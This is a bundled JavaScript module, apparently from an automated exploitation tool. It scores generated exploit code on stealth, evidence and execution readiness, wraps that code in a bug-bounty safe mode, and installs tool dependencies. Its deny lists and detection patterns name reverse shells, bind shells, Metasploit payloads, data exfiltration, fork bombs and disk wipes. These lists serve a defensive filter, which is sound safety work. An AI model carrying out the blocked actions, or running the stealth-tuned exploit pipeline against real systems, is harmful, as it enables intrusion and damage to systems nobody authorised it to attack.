import {
  applyWafEvasion,
  createIterativeLoop,
  init_exploit_chain_planner,
  init_exploit_verification_engine,
  init_iterative_exploit_loop,
  init_payload_encoding_engine,
  planExploitChain,
  selectEvasionStrategy,
  verifyExploitSuccess
} from "./chunk-5IKBKZPK.js";
import "./chunk-A4NVXZRR.js";
import "./chunk-XWTSM22M.js";
import {
  executeRawCommand,
  init_scan_server_executor
} from "./chunk-LTRNONUC.js";
import "./chunk-H2SPD57V.js";
import "./chunk-5TJ6FS74.js";
import "./chunk-UYX5D64U.js";
import "./chunk-SD56WPOS.js";
import "./chunk-NRYVRXXR.js";
import "./chunk-YB6W7YNA.js";
import {
  __esm
} from "./chunk-KFQGP6VL.js";

// server/lib/exploit-quality-scorer.ts
function validateStructure(input) {
  const findings = [];
  let score = 100;
  const code = input.code.trim();
  if (code.length < 10) {
    score -= 80;
    findings.push("Exploit code is too short to be functional");
  }
  switch (input.language) {
    case "bash":
      if (code.includes("$(") && !code.includes(")")) {
        score -= 30;
        findings.push("Unclosed command substitution $()");
      }
      if ((code.match(/"/g) || []).length % 2 !== 0) {
        score -= 20;
        findings.push("Unmatched double quotes");
      }
      if ((code.match(/'/g) || []).length % 2 !== 0) {
        score -= 20;
        findings.push("Unmatched single quotes");
      }
      break;
    case "python":
      if (code.includes("import ") && !code.includes("\n")) {
        score -= 10;
        findings.push("Single-line Python with import \u2014 may need multi-line");
      }
      if (code.includes("def ") && !code.includes("return") && !code.includes("print")) {
        score -= 15;
        findings.push("Function defined but no return/print \u2014 output may be lost");
      }
      break;
    case "curl":
      if (!code.includes("curl")) {
        score -= 40;
        findings.push("Curl exploit does not contain curl command");
      }
      if (!code.includes("http://") && !code.includes("https://")) {
        score -= 30;
        findings.push("No URL found in curl command");
      }
      break;
    case "raw_http":
      if (!code.match(/^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s/m)) {
        score -= 30;
        findings.push("No HTTP method found in raw HTTP request");
      }
      break;
  }
  const placeholders = code.match(/\{[A-Z_]+\}|\{\{[a-z_]+\}\}|<PLACEHOLDER>|TODO|FIXME|XXX/gi);
  if (placeholders) {
    score -= 20 * Math.min(placeholders.length, 3);
    findings.push(`Found ${placeholders.length} unfilled placeholder(s): ${placeholders.slice(0, 3).join(", ")}`);
  }
  if (code.includes("example.com") || code.includes("192.168.1.1") || code.includes("10.0.0.1")) {
    if (!input.target?.includes("example.com")) {
      score -= 15;
      findings.push("Contains example/placeholder IP or domain \u2014 may not target actual host");
    }
  }
  if (findings.length === 0) {
    findings.push("Structural validation passed \u2014 no issues found");
  }
  return {
    score: Math.max(0, score),
    weight: 0.2,
    assessment: score >= 80 ? "Structurally sound" : score >= 50 ? "Minor structural issues" : "Significant structural problems",
    findings
  };
}
function scoreComplexity(input) {
  const findings = [];
  let score = 50;
  const code = input.code;
  const lines = code.split("\n").filter((l) => l.trim().length > 0);
  if (lines.length > 50) {
    score += 15;
    findings.push("Multi-stage exploit (50+ lines)");
  } else if (lines.length > 20) {
    score += 10;
    findings.push("Moderate complexity (20+ lines)");
  } else if (lines.length < 5) {
    score -= 15;
    findings.push("Very simple exploit (< 5 lines)");
  }
  const conditionals = (code.match(/\bif\b|\belse\b|\belif\b|\bcase\b|\bswitch\b|\bthen\b/gi) || []).length;
  if (conditionals > 3) {
    score += 15;
    findings.push(`Contains ${conditionals} conditional branches \u2014 adaptive logic`);
  } else if (conditionals > 0) {
    score += 5;
    findings.push(`Contains ${conditionals} conditional(s)`);
  }
  const loops = (code.match(/\bfor\b|\bwhile\b|\bdo\b|\buntil\b/gi) || []).length;
  if (loops > 0) {
    score += 10;
    findings.push(`Contains ${loops} loop(s) \u2014 iterative approach`);
  }
  if (code.match(/try|catch|except|trap|set\s+-e|error/i)) {
    score += 10;
    findings.push("Includes error handling");
  }
  if (code.match(/base64|urlencode|hex|encode|decode/i)) {
    score += 10;
    findings.push("Uses encoding/transformation techniques");
  }
  if (code.match(/step\s*[123]|phase\s*[123]|stage\s*[123]|first.*then.*finally/i)) {
    score += 15;
    findings.push("Multi-phase exploitation approach");
  }
  if (code.match(/callback|oob|interact\.sh|burpcollaborator|webhook/i)) {
    score += 10;
    findings.push("Uses out-of-band verification");
  }
  return {
    score: Math.min(100, Math.max(0, score)),
    weight: 0.1,
    assessment: score >= 70 ? "Sophisticated exploit" : score >= 40 ? "Moderate complexity" : "Simple/basic exploit",
    findings
  };
}
function calibrateConfidence(input) {
  const findings = [];
  let score = 60;
  const code = input.code;
  if (input.target && code.includes(input.target)) {
    score += 10;
    findings.push("Exploit targets the specific host");
  }
  if (input.vulnClass) {
    const vulnPatterns = {
      sqli: [/SELECT|UNION|INSERT|UPDATE|DELETE|DROP|OR\s+1=1|AND\s+1=1|SLEEP|WAITFOR/i],
      xss: [/<script|onerror|onload|alert\(|document\.|innerHTML/i],
      ssrf: [/127\.0\.0\.1|169\.254\.169\.254|localhost|metadata|internal/i],
      cmdi: [/;\s*\w|`\w|\$\(|\/bin\/|\/etc\/|whoami|id\b|cat\s/i],
      ssti: [/\{\{.*\}\}|\$\{.*\}|<%.*%>/],
      lfi: [/\.\.\//]
    };
    const patterns = vulnPatterns[input.vulnClass];
    if (patterns) {
      const matches = patterns.filter((p) => p.test(code));
      if (matches.length > 0) {
        score += 15;
        findings.push(`Exploit contains ${input.vulnClass}-specific patterns`);
      } else {
        score -= 20;
        findings.push(`Exploit lacks ${input.vulnClass}-specific patterns \u2014 may be misclassified`);
      }
    }
  }
  if (code.match(/verify|confirm|check|validate|proof|evidence/i)) {
    score += 10;
    findings.push("Includes verification/confirmation logic");
  }
  if (code.match(/cleanup|restore|revert|undo|original/i)) {
    score += 5;
    findings.push("Includes cleanup/restoration steps");
  }
  if (code.match(/generic|template|example|sample|demo/i)) {
    score -= 15;
    findings.push("Appears to be a generic/template exploit \u2014 may need customization");
  }
  const lines = code.split("\n");
  const uniqueLines = new Set(lines.map((l) => l.trim()).filter((l) => l.length > 5));
  const duplicationRatio = uniqueLines.size / Math.max(lines.length, 1);
  if (duplicationRatio < 0.5 && lines.length > 10) {
    score -= 25;
    findings.push(`High duplication ratio (${Math.round(duplicationRatio * 100)}% unique) \u2014 possible filler content`);
  }
  return {
    score: Math.min(100, Math.max(0, score)),
    weight: 0.25,
    assessment: score >= 70 ? "High confidence" : score >= 40 ? "Moderate confidence" : "Low confidence \u2014 review recommended",
    findings
  };
}
function assessSafety(input) {
  const findings = [];
  const issues = [];
  let score = 100;
  const code = input.code;
  for (const dc of DANGEROUS_COMMANDS) {
    if (dc.pattern.test(code)) {
      const penalty = dc.severity === "critical" ? 50 : dc.severity === "high" ? 30 : 15;
      score -= penalty;
      findings.push(`[${dc.severity.toUpperCase()}] ${dc.description}`);
    }
  }
  if (input.safeMode || input.isBugBounty) {
    for (const smv of SAFE_MODE_VIOLATIONS) {
      if (smv.pattern.test(code)) {
        score -= 30;
        findings.push(`[SAFE MODE VIOLATION] ${smv.description}`);
      }
    }
  }
  if (code.match(/DROP|TRUNCATE|DELETE\s+FROM|rm\s+-rf|format|wipe/i)) {
    score -= 20;
    findings.push("Contains potentially destructive operations");
  }
  if (code.match(/broadcast|flood|ddos|amplif/i)) {
    score -= 40;
    findings.push("Contains potential network-wide impact (DoS/DDoS)");
  }
  if (input.target) {
    const targetHost = extractHost(input.target);
    const allHosts = extractAllHosts(code);
    const outOfScope = allHosts.filter((h) => h !== targetHost && !isOobDomain(h));
    if (outOfScope.length > 0) {
      score -= 15;
      findings.push(`Targets out-of-scope hosts: ${outOfScope.slice(0, 3).join(", ")}`);
    }
  }
  if (findings.length === 0) {
    findings.push("No safety concerns detected");
  }
  return {
    score: Math.max(0, score),
    weight: 0.25,
    assessment: score >= 80 ? "Safe to execute" : score >= 50 ? "Caution advised" : "Potentially dangerous \u2014 manual review required",
    findings
  };
}
function scoreEvidence(input) {
  const findings = [];
  let score = 40;
  const code = input.code;
  if (code.match(/echo|print|cat|type|output|result|response/i)) {
    score += 15;
    findings.push("Captures output for evidence");
  }
  if (code.match(/>\s*\w+\.(txt|log|json|xml|html|csv)|tee\s|save|write/i)) {
    score += 15;
    findings.push("Saves results to file");
  }
  if (code.match(/screenshot|capture|record/i)) {
    score += 10;
    findings.push("Includes visual evidence capture");
  }
  if (code.match(/date|timestamp|log|time/i)) {
    score += 10;
    findings.push("Includes timestamping/logging");
  }
  if (code.match(/-v\b|-i\b|--include|--verbose|response\.text|response\.status/i)) {
    score += 10;
    findings.push("Captures HTTP response details");
  }
  if (code.match(/interact\.sh|burpcollaborator|oob|callback/i)) {
    score += 15;
    findings.push("Uses OOB for independent evidence");
  }
  if (code.match(/diff|compare|before|after|baseline/i)) {
    score += 10;
    findings.push("Includes before/after comparison");
  }
  return {
    score: Math.min(100, Math.max(0, score)),
    weight: 0.1,
    assessment: score >= 70 ? "Strong evidence capture" : score >= 40 ? "Moderate evidence" : "Weak evidence \u2014 may not produce verifiable proof",
    findings
  };
}
function rateStealth(input) {
  const findings = [];
  let score = 50;
  const code = input.code;
  if (code.match(/User-Agent|ua\s*=/i)) {
    score += 10;
    findings.push("Custom User-Agent header");
  }
  if (code.match(/sleep|delay|wait|time\.sleep|setTimeout/i)) {
    score += 10;
    findings.push("Includes timing delays");
  }
  if (code.match(/encode|obfuscat|encrypt|base64|hex/i)) {
    score += 15;
    findings.push("Uses encoding/obfuscation");
  }
  if (code.match(/naabu|masscan|nikto|dirb|gobuster|ffuf/i)) {
    score -= 20;
    findings.push("Uses noisy scanning tools");
  }
  if (code.match(/brute|wordlist|dictionary|rockyou/i)) {
    score -= 15;
    findings.push("Brute force approach \u2014 highly detectable");
  }
  const curlCount = (code.match(/curl\s/g) || []).length;
  if (curlCount > 10) {
    score -= 10;
    findings.push(`${curlCount} HTTP requests \u2014 may trigger rate limiting`);
  }
  if (code.match(/proxy|socks|tor\s|--proxy/i)) {
    score += 15;
    findings.push("Uses proxy/Tor for anonymity");
  }
  return {
    score: Math.min(100, Math.max(0, score)),
    weight: 0.1,
    assessment: score >= 70 ? "Stealthy approach" : score >= 40 ? "Moderate detectability" : "Highly detectable \u2014 may trigger alerts",
    findings
  };
}
function scoreExploit(input) {
  if (input.language === "unknown") {
    input.language = detectLanguage(input.code);
  }
  const structural = validateStructure(input);
  const complexity = scoreComplexity(input);
  const confidence = calibrateConfidence(input);
  const safety = assessSafety(input);
  const evidence = scoreEvidence(input);
  const stealth = rateStealth(input);
  const dimensions = { structural, complexity, confidence, safety, evidence, stealth };
  const totalWeight = Object.values(dimensions).reduce((sum, d) => sum + d.weight, 0);
  const overall = Math.round(
    Object.values(dimensions).reduce((sum, d) => sum + d.score * d.weight, 0) / totalWeight
  );
  const issues = [];
  for (const finding of structural.findings) {
    if (structural.score < 50) {
      issues.push({ severity: "high", category: "structural", description: finding });
    }
  }
  for (const finding of safety.findings) {
    if (finding.includes("[CRITICAL]")) {
      issues.push({ severity: "critical", category: "safety", description: finding });
    } else if (finding.includes("[HIGH]")) {
      issues.push({ severity: "high", category: "safety", description: finding });
    } else if (finding.includes("[SAFE MODE VIOLATION]")) {
      issues.push({ severity: "critical", category: "safety", description: finding });
    }
  }
  if (confidence.score < 40) {
    issues.push({ severity: "medium", category: "confidence", description: "Low confidence \u2014 exploit may not succeed" });
  }
  const suggestions = [];
  if (structural.score < 70) suggestions.push("Fix structural issues before execution");
  if (confidence.score < 50) suggestions.push("Add target-specific customization to improve confidence");
  if (evidence.score < 50) suggestions.push("Add output capture and evidence collection");
  if (stealth.score < 40) suggestions.push("Add timing delays and encoding to improve stealth");
  if (safety.score < 70) suggestions.push("Review and mitigate safety concerns before execution");
  if (complexity.score < 30) suggestions.push("Exploit may be too simple \u2014 consider adding error handling and conditional logic");
  let verdict;
  if (safety.score < 30 || issues.some((i) => i.severity === "critical")) {
    verdict = "fail";
  } else if (overall < 40 || issues.some((i) => i.severity === "high")) {
    verdict = "warn";
  } else {
    verdict = "pass";
  }
  const executeRecommendation = verdict !== "fail" && structural.score >= 40 && safety.score >= 40;
  return {
    overall,
    dimensions,
    verdict,
    issues,
    suggestions,
    executeRecommendation
  };
}
function quickValidate(input) {
  const code = input.code.trim();
  if (code.length < 10) return { pass: false, reason: "Exploit code too short" };
  for (const dc of DANGEROUS_COMMANDS) {
    if (dc.severity === "critical" && dc.pattern.test(code)) {
      return { pass: false, reason: `Critical safety issue: ${dc.description}` };
    }
  }
  if (input.safeMode || input.isBugBounty) {
    for (const smv of SAFE_MODE_VIOLATIONS) {
      if (smv.pattern.test(code)) {
        return { pass: false, reason: `Safe mode violation: ${smv.description}` };
      }
    }
  }
  return { pass: true };
}
function generateQualityReport(score) {
  const lines = [];
  lines.push(`\u2550\u2550\u2550 Exploit Quality Report \u2550\u2550\u2550`);
  lines.push(`Overall Score: ${score.overall}/100 [${score.verdict.toUpperCase()}]`);
  lines.push(`Execute Recommendation: ${score.executeRecommendation ? "YES" : "NO"}`);
  lines.push("");
  lines.push("Dimension Scores:");
  for (const [name, dim] of Object.entries(score.dimensions)) {
    lines.push(`  ${name.padEnd(12)} ${dim.score.toString().padStart(3)}/100  ${dim.assessment}`);
  }
  lines.push("");
  if (score.issues.length > 0) {
    lines.push("Issues:");
    for (const issue of score.issues) {
      lines.push(`  [${issue.severity.toUpperCase()}] ${issue.description}`);
    }
    lines.push("");
  }
  if (score.suggestions.length > 0) {
    lines.push("Suggestions:");
    for (const suggestion of score.suggestions) {
      lines.push(`  \u2022 ${suggestion}`);
    }
  }
  return lines.join("\n");
}
function detectLanguage(code) {
  if (code.match(/^#!/) && code.match(/bash|sh/)) return "bash";
  if (code.match(/^#!/) && code.match(/python/)) return "python";
  if (code.match(/^curl\s/m)) return "curl";
  if (code.match(/import\s+\w|from\s+\w+\s+import|def\s+\w+\(|print\(/)) return "python";
  if (code.match(/\$\(|&&|;\s*\w+|echo\s|grep\s|awk\s|sed\s/)) return "bash";
  if (code.match(/^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+\//m)) return "raw_http";
  if (code.match(/require\s+'|gem\s|puts\s|\.each\s/)) return "ruby";
  if (code.match(/Get-|Invoke-|New-Object|Write-Host|\$PSVersionTable/i)) return "powershell";
  return "bash";
}
function extractHost(url) {
  try {
    return new URL(url).hostname;
  } catch {
    return url.replace(/^https?:\/\//, "").split(/[:/]/)[0];
  }
}
function extractAllHosts(code) {
  const urlPattern = /https?:\/\/([a-zA-Z0-9.-]+)/g;
  const hosts = /* @__PURE__ */ new Set();
  let match;
  while ((match = urlPattern.exec(code)) !== null) {
    hosts.add(match[1]);
  }
  return Array.from(hosts);
}
function isOobDomain(host) {
  const oobPatterns = [
    /interact\.sh$/,
    /burpcollaborator\.net$/,
    /oastify\.com$/,
    /oob\./,
    /callback\./,
    /canary\./,
    /dnslog\./
  ];
  return oobPatterns.some((p) => p.test(host));
}
var DANGEROUS_COMMANDS, SAFE_MODE_VIOLATIONS;
var init_exploit_quality_scorer = __esm({
  "server/lib/exploit-quality-scorer.ts"() {
    "use strict";
    DANGEROUS_COMMANDS = [
      { pattern: /rm\s+-rf\s+\/(?!\w)/i, severity: "critical", description: "Recursive deletion of root filesystem" },
      { pattern: /mkfs\s/i, severity: "critical", description: "Filesystem format command" },
      { pattern: /dd\s+if=.*of=\/dev\//i, severity: "critical", description: "Direct disk write" },
      { pattern: /:(){ :\|:& };:/i, severity: "critical", description: "Fork bomb" },
      { pattern: />\s*\/dev\/sd[a-z]/i, severity: "critical", description: "Direct write to disk device" },
      { pattern: /shutdown|reboot|halt|poweroff/i, severity: "high", description: "System shutdown/reboot command" },
      { pattern: /DROP\s+DATABASE/i, severity: "high", description: "Database deletion" },
      { pattern: /DROP\s+TABLE/i, severity: "high", description: "Table deletion" },
      { pattern: /TRUNCATE\s+TABLE/i, severity: "high", description: "Table truncation" },
      { pattern: /DELETE\s+FROM\s+\w+\s*(?:;|$)/i, severity: "high", description: "Unconditional DELETE (no WHERE clause)" },
      { pattern: /UPDATE\s+\w+\s+SET\s+.*(?:;|$)(?!.*WHERE)/i, severity: "high", description: "Unconditional UPDATE (no WHERE clause)" },
      { pattern: /chmod\s+777/i, severity: "medium", description: "World-writable permissions" },
      { pattern: /curl\s+.*\|\s*(?:bash|sh|python)/i, severity: "medium", description: "Pipe remote content to interpreter" },
      { pattern: /wget\s+.*-O\s*-\s*\|\s*(?:bash|sh)/i, severity: "medium", description: "Download and execute" }
    ];
    SAFE_MODE_VIOLATIONS = [
      { pattern: /reverse\s*shell|rev\s*shell|nc\s+-e|ncat\s+-e/i, description: "Reverse shell attempt" },
      { pattern: /bind\s*shell/i, description: "Bind shell attempt" },
      { pattern: /meterpreter|msfvenom|metasploit/i, description: "Metasploit payload" },
      { pattern: /persistence|backdoor|rootkit/i, description: "Persistence mechanism" },
      { pattern: /keylog|screenshot|webcam|microphone/i, description: "Surveillance capability" },
      { pattern: /exfiltrat|data\s*theft|steal/i, description: "Data exfiltration" },
      { pattern: /ransomware|encrypt.*files|crypto.*lock/i, description: "Ransomware behavior" },
      { pattern: /wiper|destroy|corrupt/i, description: "Destructive payload" }
    ];
  }
});

// server/lib/bug-bounty-safe-mode.ts
function scanForViolations(code) {
  const violations = [];
  for (const rule of DESTRUCTIVE_PATTERNS) {
    const match = rule.pattern.exec(code);
    if (match) {
      violations.push({
        type: rule.type,
        description: rule.desc,
        payload: match[0],
        severity: rule.severity,
        blocked: true
      });
    }
  }
  return violations;
}
function applySafeMode(code, language, config = DEFAULT_SAFE_CONFIG) {
  if (!config.enabled) {
    return { safeCode: code, violations: [], modified: false };
  }
  const violations = scanForViolations(code);
  const criticalViolations = violations.filter((v) => v.severity === "critical");
  if (criticalViolations.length > 0) {
    const violationList = criticalViolations.map((v) => `- ${v.description}: ${v.payload}`).join("\n");
    if (language === "python") {
      return {
        safeCode: `#!/usr/bin/env python3
# BLOCKED BY SAFE MODE
# Critical safety violations detected:
${criticalViolations.map((v) => `# - ${v.description}: ${v.payload}`).join("\n")}
import sys
print("[SAFE MODE] Exploit blocked \u2014 contains destructive operations")
print("[SAFE MODE] Violations:")
${criticalViolations.map((v) => `print("  - ${v.description}")`).join("\n")}
sys.exit(1)
`,
        violations,
        modified: true
      };
    } else {
      return {
        safeCode: `#!/bin/bash
# BLOCKED BY SAFE MODE
# Critical safety violations detected:
${criticalViolations.map((v) => `# - ${v.description}: ${v.payload}`).join("\n")}
echo "[SAFE MODE] Exploit blocked \u2014 contains destructive operations"
exit 1
`,
        violations,
        modified: true
      };
    }
  }
  let safeCode = code;
  let modified = false;
  if (language === "python") {
    safeCode = `#!/usr/bin/env python3
"""ScanForge Safe Mode Wrapper"""
import signal, sys

# Safe mode constraints
MAX_EXFIL_BYTES = ${config.maxExfilBytes}
MAX_EXEC_TIME = ${config.maxExecTimeSec}

def _safe_timeout_handler(signum, frame):
    print("[SAFE MODE] Execution time limit reached")
    sys.exit(0)

signal.signal(signal.SIGALRM, _safe_timeout_handler)
signal.alarm(MAX_EXEC_TIME)

def safe_print(data, label="output"):
    """Print data respecting exfiltration limits"""
    s = str(data)
    if len(s) > MAX_EXFIL_BYTES:
        print(f"[SAFE MODE] Output truncated to {MAX_EXFIL_BYTES} bytes (proof only)")
        s = s[:MAX_EXFIL_BYTES] + "... [TRUNCATED]"
    print(f"[{label}] {s}")

# \u2500\u2500 Original exploit (safe mode active) \u2500\u2500
${code}
`;
    modified = true;
  } else if (language === "bash") {
    safeCode = `#!/bin/bash
# ScanForge Safe Mode Wrapper
MAX_EXEC_TIME=${config.maxExecTimeSec}
MAX_EXFIL_BYTES=${config.maxExfilBytes}

# Set execution timeout
trap 'echo "[SAFE MODE] Execution time limit reached"; exit 0' ALRM
(sleep $MAX_EXEC_TIME && kill -ALRM $$ 2>/dev/null) &

safe_print() {
    local data="$1"
    local label="\${2:-output}"
    local len=\${#data}
    if [ "$len" -gt "$MAX_EXFIL_BYTES" ]; then
        echo "[SAFE MODE] Output truncated to $MAX_EXFIL_BYTES bytes (proof only)"
        data="\${data:0:$MAX_EXFIL_BYTES}... [TRUNCATED]"
    fi
    echo "[$label] $data"
}

# \u2500\u2500 Original exploit (safe mode active) \u2500\u2500
${code}
`;
    modified = true;
  }
  return { safeCode, violations, modified };
}
function createSafeMode(rules) {
  const config = {
    enabled: true,
    maxSeverity: rules.maxSeverity || "critical",
    allowedActions: rules.allowedActions || ["read", "enumerate"],
    prohibitedActions: rules.prohibitedActions || ["data_destruction", "service_disruption"],
    scopeRules: rules.scope || rules.scopeRules || { inScope: [], outOfScope: [] },
    evidenceRequired: rules.evidenceRequired ?? true,
    oobTestingEnabled: rules.oobTestingEnabled ?? true
  };
  return {
    config,
    checkExploit(code, vulnClass) {
      const violations = scanForViolations(code);
      const result = applySafeMode(code, "python", config);
      return {
        allowed: violations.filter((v) => v.severity === "critical").length === 0,
        violations,
        safeCode: result.safeCode
      };
    }
  };
}
var DEFAULT_SAFE_CONFIG, DESTRUCTIVE_PATTERNS;
var init_bug_bounty_safe_mode = __esm({
  "server/lib/bug-bounty-safe-mode.ts"() {
    "use strict";
    init_scan_server_executor();
    DEFAULT_SAFE_CONFIG = {
      enabled: true,
      scopeTargets: [],
      scopePorts: [80, 443, 8080, 8443],
      maxExfilBytes: 1024,
      // 1KB max for proof
      useInteractsh: true,
      interactshServer: "oast.pro",
      useInternalOob: true,
      captureScreenshots: true,
      hashAlgorithm: "sha256",
      maxExecTimeSec: 30,
      platform: "none"
    };
    DESTRUCTIVE_PATTERNS = [
      // File system destruction
      { pattern: /rm\s+(-rf?|--recursive)\s+\//i, type: "destructive_payload", severity: "critical", desc: "Recursive file deletion" },
      { pattern: /mkfs\s/i, type: "destructive_payload", severity: "critical", desc: "Filesystem format" },
      { pattern: /dd\s+if=.*of=\/dev\//i, type: "destructive_payload", severity: "critical", desc: "Direct disk write" },
      { pattern: /:(){ :\|:& };:/i, type: "destructive_payload", severity: "critical", desc: "Fork bomb" },
      // Database destruction
      { pattern: /DROP\s+(TABLE|DATABASE|SCHEMA)\s/i, type: "destructive_payload", severity: "critical", desc: "Database DROP statement" },
      { pattern: /TRUNCATE\s+TABLE/i, type: "destructive_payload", severity: "critical", desc: "Table truncation" },
      { pattern: /DELETE\s+FROM\s+\w+\s*(;|$)/i, type: "destructive_payload", severity: "high", desc: "Unconditional DELETE" },
      { pattern: /UPDATE\s+\w+\s+SET\s+.*WHERE\s+1\s*=\s*1/i, type: "destructive_payload", severity: "high", desc: "Mass UPDATE" },
      // Persistent access
      { pattern: /crontab\s/i, type: "persistent_access", severity: "high", desc: "Cron job installation" },
      { pattern: /\.ssh\/authorized_keys/i, type: "persistent_access", severity: "high", desc: "SSH key installation" },
      { pattern: /useradd|adduser/i, type: "persistent_access", severity: "high", desc: "User account creation" },
      { pattern: /systemctl\s+enable/i, type: "persistent_access", severity: "high", desc: "Service persistence" },
      { pattern: /nc\s+-l.*-e|ncat.*--exec|socat.*EXEC/i, type: "persistent_access", severity: "high", desc: "Bind shell" },
      { pattern: /bash\s+-i\s+>&\s*\/dev\/tcp/i, type: "persistent_access", severity: "high", desc: "Reverse shell" },
      { pattern: /msfvenom|meterpreter/i, type: "persistent_access", severity: "high", desc: "Metasploit payload" },
      // Data exfiltration
      { pattern: /curl.*-d\s+@|wget.*--post-file/i, type: "data_exfil", severity: "medium", desc: "File upload/exfiltration" },
      { pattern: /tar\s+.*-c.*\|.*base64|zip.*-r.*\|/i, type: "data_exfil", severity: "medium", desc: "Archive and exfiltrate" },
      // Banned techniques
      { pattern: /iptables.*-F|iptables.*--flush/i, type: "banned_technique", severity: "critical", desc: "Firewall flush" },
      { pattern: /shutdown|reboot|halt|poweroff/i, type: "banned_technique", severity: "critical", desc: "System shutdown/reboot" },
      { pattern: /kill\s+-9\s+1\b|kill\s+-KILL\s+1\b/i, type: "banned_technique", severity: "critical", desc: "Kill init process" }
    ];
  }
});

// server/lib/exploit-dependency-manager.ts
async function checkDependencies(manifest) {
  const checks = [];
  const missingRequired = [];
  const missingOptional = [];
  const dependencies = manifest.dependencies || [];
  for (const dep of dependencies) {
    const cacheKey = `${dep.type}:${dep.name}`;
    const cached = installCache.get(cacheKey);
    if (cached && Date.now() - cached.checkedAt < CACHE_TTL_MS) {
      checks.push({ dependency: dep, installed: cached.installed, version: cached.version });
      if (!cached.installed) {
        (dep.required ? missingRequired : missingOptional).push(dep);
      }
      continue;
    }
    const result = await checkSingleDependency(dep);
    checks.push(result);
    installCache.set(cacheKey, { installed: result.installed, version: result.version, checkedAt: Date.now() });
    if (!result.installed) {
      (dep.required ? missingRequired : missingOptional).push(dep);
    }
  }
  return {
    ready: missingRequired.length === 0,
    checks,
    missingRequired,
    missingOptional
  };
}
async function checkSingleDependency(dep) {
  try {
    switch (dep.type) {
      case "python": {
        const result = await executeRawCommand(
          `python3 -c "import ${dep.name.replace(/-/g, "_")}; print(getattr(${dep.name.replace(/-/g, "_")}, '__version__', 'unknown'))" 2>&1`,
          10
        );
        const installed = result.exitCode === 0;
        return { dependency: dep, installed, version: installed ? result.stdout.trim() : void 0 };
      }
      case "system": {
        const result = await executeRawCommand(`which ${dep.name} 2>/dev/null && ${dep.name} --version 2>&1 | head -1`, 10);
        const installed = result.exitCode === 0 && !result.stdout.includes("not found");
        return { dependency: dep, installed, version: installed ? result.stdout.trim().split("\n").pop() : void 0 };
      }
      case "wordlist": {
        const result = await executeRawCommand(`test -f "${dep.name}" && echo "exists" || echo "missing"`, 5);
        return { dependency: dep, installed: result.stdout.includes("exists") };
      }
      case "go": {
        const result = await executeRawCommand(`which ${dep.name} 2>/dev/null`, 5);
        return { dependency: dep, installed: result.exitCode === 0 };
      }
      default:
        return { dependency: dep, installed: false, error: `Unknown dependency type: ${dep.type}` };
    }
  } catch (err) {
    return { dependency: dep, installed: false, error: err.message };
  }
}
async function installDependencies(deps) {
  const startTime = Date.now();
  const installed = [];
  const failed = [];
  if (!Array.isArray(deps)) {
    console.warn(`[DepManager] installDependencies received non-array:`, typeof deps);
    return { success: true, installed: [], failed: [], durationMs: 0 };
  }
  for (const dep of deps) {
    try {
      const cmd = getInstallCommand(dep);
      if (!cmd) {
        failed.push({ name: dep.name, error: "No install command available" });
        continue;
      }
      console.log(`[DepManager] Installing ${dep.type}:${dep.name} \u2192 ${cmd}`);
      const result = await executeRawCommand(cmd, 120);
      if (result.exitCode === 0) {
        installed.push(dep.name);
        installCache.set(`${dep.type}:${dep.name}`, { installed: true, checkedAt: Date.now() });
      } else {
        if (dep.fallback) {
          console.log(`[DepManager] Trying fallback: ${dep.fallback}`);
          const fbResult = await executeRawCommand(
            getInstallCommand({ ...dep, name: dep.fallback }) || "",
            120
          );
          if (fbResult.exitCode === 0) {
            installed.push(`${dep.name} (fallback: ${dep.fallback})`);
          } else {
            failed.push({ name: dep.name, error: result.stderr || "Install failed" });
          }
        } else {
          failed.push({ name: dep.name, error: result.stderr || "Install failed" });
        }
      }
    } catch (err) {
      failed.push({ name: dep.name, error: err.message });
    }
  }
  return {
    success: failed.filter((f) => deps.find((d) => d.name === f.name)?.required).length === 0,
    installed,
    failed,
    durationMs: Date.now() - startTime
  };
}
function getInstallCommand(dep) {
  if (dep.installCmd) return dep.installCmd;
  switch (dep.type) {
    case "python":
      return `pip3 install ${dep.name}${dep.version ? dep.version : ""} --quiet 2>&1`;
    case "system":
      return `apt-get install -y ${dep.name} 2>&1 || yum install -y ${dep.name} 2>&1`;
    case "go":
      return null;
    // Go tools need explicit installCmd
    case "wordlist":
      if (dep.name.includes("seclists")) {
        return `apt-get install -y seclists 2>&1 || git clone --depth 1 https://github.com/danielmiessler/SecLists.git /usr/share/seclists 2>&1`;
      }
      return null;
    default:
      return null;
  }
}
function inferDependencies(code, language) {
  const deps = [];
  const seen = /* @__PURE__ */ new Set();
  if (language === "python") {
    const importPatterns = [
      /^import\s+(\w+)/gm,
      /^from\s+(\w+)/gm
    ];
    for (const pattern of importPatterns) {
      let match;
      while ((match = pattern.exec(code)) !== null) {
        const mod = match[1];
        if (!PYTHON_STDLIB.has(mod) && !seen.has(mod)) {
          seen.add(mod);
          deps.push({
            type: "python",
            name: PYTHON_PACKAGE_MAP[mod] || mod,
            required: true
          });
        }
      }
    }
    const subprocessPattern = /subprocess\.(?:run|call|Popen)\s*\(\s*\[?\s*['"]([\w-]+)/g;
    let spMatch;
    while ((spMatch = subprocessPattern.exec(code)) !== null) {
      const tool = spMatch[1];
      if (!seen.has(tool)) {
        seen.add(tool);
        deps.push({ type: "system", name: tool, required: false });
      }
    }
  } else if (language === "bash") {
    const cmdPattern = /(?:^|\||\$\(|`)\s*([\w.-]+)\s/gm;
    let match;
    while ((match = cmdPattern.exec(code)) !== null) {
      const cmd = match[1];
      if (!BASH_BUILTINS.has(cmd) && !seen.has(cmd)) {
        seen.add(cmd);
        deps.push({ type: "system", name: cmd, required: false });
      }
    }
  }
  return deps;
}
function buildManifest(exploitId, code, language, vulnClass) {
  const inferred = inferDependencies(code, language);
  const known = vulnClass ? COMMON_MANIFESTS[vulnClass] || [] : [];
  const merged = [...inferred];
  for (const dep of known) {
    if (!merged.some((d) => d.type === dep.type && d.name === dep.name)) {
      merged.push(dep);
    }
  }
  return {
    exploitId,
    language,
    dependencies: merged
  };
}
async function resolveDependencies(missing, language) {
  const deps = missing.map(
    (m) => typeof m === "string" ? { name: m, type: language === "python" ? "python" : "system", required: true } : m
  );
  const manifest = {
    exploitId: "pipeline-resolve",
    language,
    dependencies: deps
  };
  return installDependencies(manifest.dependencies);
}
var COMMON_MANIFESTS, installCache, CACHE_TTL_MS, PYTHON_STDLIB, PYTHON_PACKAGE_MAP, BASH_BUILTINS;
var init_exploit_dependency_manager = __esm({
  "server/lib/exploit-dependency-manager.ts"() {
    "use strict";
